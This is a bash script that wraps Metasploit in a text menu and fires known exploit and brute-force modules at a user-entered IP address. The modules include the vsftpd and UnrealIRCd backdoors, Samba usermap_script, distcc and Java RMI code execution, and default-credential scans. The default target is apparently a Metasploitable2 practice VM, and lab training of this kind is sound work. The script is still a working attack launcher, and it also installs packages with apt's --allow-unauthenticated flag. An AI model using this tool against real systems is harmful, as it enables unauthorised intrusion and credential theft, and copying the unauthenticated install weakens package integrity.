#!/bin/bash
# ============================================================
# Metasploit Attack Menu — TUI
# Description : Whiptail menu for launching known Metasploitable2
#               exploit modules through the native msfconsole
#               already installed on the attacker machine (e.g.
#               Kali ships with Metasploit Framework built in).
#               No Docker required on the attacker side.
# Usage       : sudo bash setup_attacker.sh
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Minimal monochrome whiptail theme
export NEWT_COLORS='
root=white,black
border=white,black
window=white,black
shadow=,black
title=white,black
button=black,white
actbutton=white,black
checkbox=white,black
actcheckbox=black,white
entry=white,black
label=white,black
listbox=white,black
actlistbox=black,white
textbox=white,black
acttextbox=black,white
helpline=white,black
roottext=white,black
'

echo -e "${CYAN}"
cat <<'EOF'
┌─────────────────────────────────┐
│   METASPLOIT ATTACK CONSOLE     │
└─────────────────────────────────┘
EOF
echo -e "${NC}"

# ============================================================
# STEP 0: Ensure msfconsole is present (not auto-installed — it's
#         a large framework; Kali ships it by default)
# ============================================================
if ! command -v msfconsole &> /dev/null; then
  echo -e "${RED}[ERROR] msfconsole not found on this machine.${NC}"
  echo -e "${YELLOW}[HINT] Install Metasploit Framework first, e.g.:${NC}"
  echo -e "  sudo apt update && sudo apt install -y metasploit-framework"
  exit 1
fi

# ============================================================
# STEP 1: Ensure whiptail is present (powers the TUI menu) —
#         the only dependency this script installs itself
# ============================================================
if ! command -v whiptail &> /dev/null; then
  echo -e "${YELLOW}[INFO] whiptail not found. Installing...${NC}"
  if ! apt update -qq 2>/dev/null; then
    if grep -qi '^ID=kali' /etc/os-release 2>/dev/null; then
      echo -e "${YELLOW}[INFO] Package index unsigned — repairing kali-archive-keyring...${NC}"
      apt-get update -qq --allow-unauthenticated
      apt-get install -y --allow-unauthenticated --reinstall kali-archive-keyring
    fi
  fi
  if ! (apt update -qq && apt install -y whiptail); then
    echo -e "${RED}[ERROR] whiptail installation failed. Aborting.${NC}"
    exit 1
  fi
  echo -e "${GREEN}[OK] whiptail installed.${NC}"
fi

# ============================================================
# STEP 2: Ask for target IP
# ============================================================
TARGET_IP=$(whiptail --title "Metasploit Attack Console" \
  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "192.168.2.20" \
  3>&1 1>&2 2>&3)
if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
  echo -e "${RED}[ERROR] No target IP provided. Aborting.${NC}"
  exit 1
fi

LHOST=$(hostname -I | awk '{print $1}')

# ============================================================
# STEP 3: Attack menu loop — pick a module, show detail, run,
#         then auto-return here (no more getting stuck at msf6 >)
# ============================================================
while true; do
  CHOICE=$(whiptail --title "Target: $TARGET_IP" \
    --menu "Choose an attack scenario:" 21 78 10 \
    "1" "FTP Backdoor - vsftpd 2.3.4 (port 21)" \
    "2" "Samba usermap_script (port 445)" \
    "3" "UnrealIRCd Backdoor (port 6667)" \
    "4" "distccd Command Execution (port 3632)" \
    "5" "Java RMI Server (port 1099)" \
    "6" "Tomcat Manager login scan (port 8180)" \
    "7" "PostgreSQL weak credentials (port 5432)" \
    "8" "MySQL no root password (port 3306)" \
    "9" "Open msfconsole (manual / free-form)" \
    3>&1 1>&2 2>&3)

  if [ $? -ne 0 ] || [ -z "$CHOICE" ]; then
    echo -e "${YELLOW}[INFO] Exiting attack menu.${NC}"
    break
  fi

  case "$CHOICE" in
    1)
      MODULE="exploit/unix/ftp/vsftpd_234_backdoor"
      PORT_INFO="21/tcp (FTP)"
      DESC="The vsftpd 2.3.4 source tarball was trojaned in 2011: sending \":)\" as part of the FTP username opens a root shell listener on port 6200."
      EXPECTED="Root shell via reverse connection, if the backdoor is present and reachable."
      ;;
    2)
      MODULE="exploit/multi/samba/usermap_script"
      PORT_INFO="139/445/tcp (Samba)"
      DESC="Samba 3.0.20's 'username map script' config option lets shell metacharacters in the login username reach a shell call, giving remote code execution."
      EXPECTED="Root shell via reverse connection."
      ;;
    3)
      MODULE="exploit/unix/irc/unreal_ircd_3281_backdoor"
      PORT_INFO="6667/tcp (UnrealIRCd)"
      DESC="The Unreal3.2.8.1 source tarball was trojaned in 2009: any message prefixed with 'AB;' sent to the IRC daemon is executed as a shell command."
      EXPECTED="Shell as the IRC daemon's user."
      ;;
    4)
      MODULE="exploit/unix/misc/distcc_exec"
      PORT_INFO="3632/tcp (distccd)"
      DESC="distcc's distributed-compile daemon executes any command sent to it with no authentication when bound in its default/insecure mode."
      EXPECTED="Shell as the low-privilege distcc user."
      ;;
    5)
      MODULE="exploit/multi/misc/java_rmi_server"
      PORT_INFO="1099/tcp (Java RMI)"
      DESC="An unauthenticated Java RMI registry lets an attacker register a remote object that loads attacker-supplied Java classes, executing arbitrary code."
      EXPECTED="Shell as the service's running user."
      ;;
    6)
      MODULE="auxiliary/scanner/http/tomcat_mgr_login"
      PORT_INFO="8180/tcp (Tomcat Manager)"
      DESC="Brute-forces the Tomcat /manager/html login with common default credentials. Valid creds can then be used with tomcat_mgr_deploy to upload a WAR and get code execution (not automated here)."
      EXPECTED="Valid manager credentials printed, if weak/default creds are set."
      ;;
    7)
      MODULE="auxiliary/scanner/postgres/postgres_login"
      PORT_INFO="5432/tcp (PostgreSQL)"
      DESC="Scans for default/weak PostgreSQL credentials (Metasploitable2 ships postgres/postgres)."
      EXPECTED="Valid database credentials printed, if weak creds are set."
      ;;
    8)
      MODULE="auxiliary/scanner/mysql/mysql_login"
      PORT_INFO="3306/tcp (MySQL)"
      DESC="Metasploitable2's MySQL root account has an empty password, so any client can authenticate as root without credentials."
      EXPECTED="Confirms unauthenticated root login to MySQL."
      ;;
    9)
      MODULE=""
      PORT_INFO="-"
      DESC="Drops into a normal msfconsole session with LHOST/RHOSTS pre-set. Use any module manually."
      EXPECTED="Full manual control — you exit whenever you like."
      ;;
  esac

  if [ -n "$MODULE" ]; then
    whiptail --title "Attack Detail" --yes-button "Run" --no-button "Back" \
      --yesno "Module : $MODULE\nPort   : $PORT_INFO\n\n$DESC\n\nExpected: $EXPECTED" 18 76
    if [ $? -ne 0 ]; then
      continue
    fi
    MSF_CMD="use $MODULE; set RHOSTS $TARGET_IP"
    case "$CHOICE" in
      6) MSF_CMD="$MSF_CMD; set RPORT 8180" ;;
      8) MSF_CMD="$MSF_CMD; set USERNAME root" ;;
    esac
    MSF_CMD="$MSF_CMD; run; sessions -l; exit -y"
  else
    whiptail --title "Attack Detail" --msgbox "$DESC\n\n$EXPECTED" 12 76
    MSF_CMD=""
  fi

  FULL_CMD="setg LHOST $LHOST; setg RHOSTS $TARGET_IP"
  if [ -n "$MSF_CMD" ]; then
    FULL_CMD="$FULL_CMD; $MSF_CMD"
  fi

  echo -e "\n${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}${NC}"
  echo -e "${CYAN}[INFO] Target IP   (RHOSTS): ${TARGET_IP}${NC}"

  msfconsole -q -x "$FULL_CMD"

  if ! whiptail --title "Metasploit Attack Console" --yesno "Run another module against $TARGET_IP?" 8 60; then
    break
  fi
done

echo -e "\n${GREEN}Session ended.${NC}"
